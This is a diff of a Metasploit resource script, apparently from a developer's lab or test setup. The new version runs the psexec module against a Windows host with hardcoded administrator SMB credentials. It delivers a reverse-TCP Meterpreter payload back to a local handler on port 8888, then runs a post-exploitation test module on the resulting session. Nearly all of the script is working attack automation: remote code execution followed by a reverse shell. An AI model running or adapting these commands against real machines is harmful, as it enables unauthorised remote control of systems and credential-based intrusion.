@@ -1,11 +1,34 @@
-#rc script to start a rev meterp handler and set autorun my test module
+# rc script to start a rev meterp handler and set autorun my test module
 
-use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lport 8888
-set lhost 192.168.1.14
-set exitonsession false
-exploit -j -z
-loadpath test/modules
+<ruby>
+	# Let's require in our "awesome" resource helping file
+	resource_dir = File.join(Msf::Config.install_root, "scripts", "resource")
+	require File.join(resource_dir, "helpers","demo_methods")
+	test_mods_dir = File.join(Msf::Config.install_root, "test", "modules")
+	run_single("loadpath #{test_mods_dir}")
+
+	# let's set some stuff up using those new methods
+	# assign lhost to be whatever IP I have on arg network
+	rc_auto_lhost("192.168.170.1/24")
+	#rc_auto_lhost("172.16.249.1")
+	# setup a handler on arg port
+	rc_auto_handler("8888")
+</ruby>
+
+# run psexec to setup our meterp session, could use db_fun here, but hardcode for now
+use windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set DisablePayloadHandler true
+set ExitOnSession false
+set RHOST 192.168.170.128
+set LPORT 8888
+set SMBUser administrator
+set SMBPass	lab
+exploit -z
+
 use post/test/services
 set SESSION 1
+<ruby>
+	rc_pause(5,true)
+</ruby>
+run
